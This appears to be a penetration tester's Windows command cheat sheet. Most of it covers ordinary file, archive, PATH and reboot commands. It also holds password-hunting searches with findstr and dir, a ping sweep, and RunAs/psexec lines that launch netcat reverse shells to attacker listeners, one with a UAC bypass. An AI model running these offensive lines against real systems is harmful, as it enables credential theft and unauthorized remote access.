# Commands

## Short path to avoid spaces

This avoids troubles for some protocols/services. Six uppercase letters + \~ + number.

```
"PROGRA~1"
```

{% embed url="https://superuser.com/questions/529400/how-does-progra1-path-notation-work" %}

## General

{% code overflow="wrap" fullWidth="true" %}
```powershell
# CHANGE DIRECTORIES / LIST DIR OR FILES QUICKER
cd E*
dir E*
type E*

# Look for hidden files
dir /A:H /s "c:\program files"
dir /a user.txt
dir *.bat /a /s
ls -force 
dir $PATH -force 
# check for files in home folders of users with names that could mean they hold passwords
dir /s C:\Users
# -----------------------------FIND/SEARCH/LOOK FOR FILES
cd C:\ && dir *.bat /a /s
dir /a /o /q # know owner of files/folders
dir /s flag2* # /s look in subsequent folders
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt
# CREATE EMPTY/TEXT FILE
echo This is sample text > MyFile.txt

# Tree
tree /f .
tree /f /a

# Like grep lines after and before. Example:
netstat -anbo | Select-String -Pattern MyPattern -Context 3,3

# ZIP FILES (Windows 10 has tar command since 2018)
tar.exe acvf yourfile.zip yourfolder
powershell Compress-Archive D:\Build\FolderName D:\Build\FolderName.zip
powershell expand-archive D:\Build\FileName.zip D:\deployments\FileName

# Permissions - calcs
$ cacls $PATH /grant $USER:F
tasklist #imagine we want to kill process.exe
taskkill /im:process.exe /F #/F to force terminationStart-Process "shell-name.exe"


echo %USERNAME%
$env:UserName
#REDIRECT OUTPUT
2>NUL
#Redirect to a file and show output like tee
dir > a.txt & type a.txt
#COUNT LINES
cat file.txt | find /c /v ""

# Type fast a long path
Instead of "Documents and Settings" --> docume~1 (first 6 characters +  ~1)
# cmd and echo
cmd.exe /c echo "Hello World" 
# move, delete and copy files
move $FILE $DESTINATION
copy $FILE $DESTINATION
del $FILE

# Checksum and integrity
certutil -hashfile test.bin SHA1
# Ping sweep
C:\>for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && t echo 10.5.5.%i is up.
# Base64 encode
echo -n 'text' | base64 -w 0
```
{% endcode %}

## RunAs / Start Process As

{% code overflow="wrap" fullWidth="true" %}
```bash
https://github.com/antonioCoco/RunasCs
C:\ > runas /env /profile /user:WORKGROUP\$username "$COMMAND"
runas /env /profile /user:HOSTNAME\Administrator "C:\temp\nc.exe -e cmd.exe $LHOST 443" 

RunasCs.exe <username> <password> cmd -r 10.0.0.1:4444
RunasCs.exe adm1 password1 "cmd /c whoami /priv" --bypass-uac
Invoke-RunasCs $user $pass whoami

# Requires interactive console
runas /user:userName cmd.exe
psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe
```
{% endcode %}

## Reboot system

```powershell
# Simulation
Restart-Computer -WhatIf
# Real reboot
Restart-Computer
```

## &#x20;variables (Windows PATH)

By default **setx** sets the variable in the local environment (Under HKEY\_Current\_User Registry key). If you want to set the system variable (Under HKEY\_LOCAL\_MACHINE registry key), use the flag **/m**. Start the command prompt as administrator on Windows 10, right click on Start menu and select **Command Prompt(Admin)**.

{% code overflow="wrap" fullWidth="true" %}
```powershell
C:\>setx /m PATH "C:\myfolder;%PATH%"
# Fix PATH environmental variable
set PATH=c:\Windows\System32\;C:\Windows\System32\WindowsPowerShell\v1.0\;%PATH%
echo %path%
# PS
(Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment" -Name "PATH").path
$Env:Path
```
{% endcode %}
